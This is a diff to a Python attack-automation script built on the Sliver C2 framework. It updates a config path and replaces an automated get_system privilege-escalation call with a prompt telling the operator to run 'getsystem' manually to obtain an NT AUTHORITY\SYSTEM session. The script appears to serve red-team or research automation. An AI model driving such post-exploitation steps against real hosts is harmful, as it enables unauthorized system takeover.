@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -62,38 +62,10 @@ async def main():
     console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
     sliver_sessionid = await sliver_executor.select_sessions()
 
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
-    console.print(f"  Description: Target process ID or name for privilege escalation")
-    default_val = ""
-    user_input = console.input(
-        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
-    ) or default_val
-    if not user_input and False:
-        raise ValueError("Missing required parameter: hosting_process")
-    user_params["hosting_process"] = user_input
-
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: config[/]")
-    console.print(f"  Description: Configuration options for escalation method")
-    default_val = "Service"
-    user_input = console.input(
-        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
-    ) or default_val
-    if not user_input and False:
-        raise ValueError("Missing required parameter: config")
-    user_params["config"] = user_input
-
-    user_params["SessionID"] = sliver_sessionid
-
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
+    console.print("[bold green][MANUAL ACTION REQUIRED][/bold green]")
+    console.print("In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations.")
     confirm_action()
-    try:
-        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
+    sliver_sessionid = await sliver_executor.select_sessions()
 
     confirm_action()
     commands = """
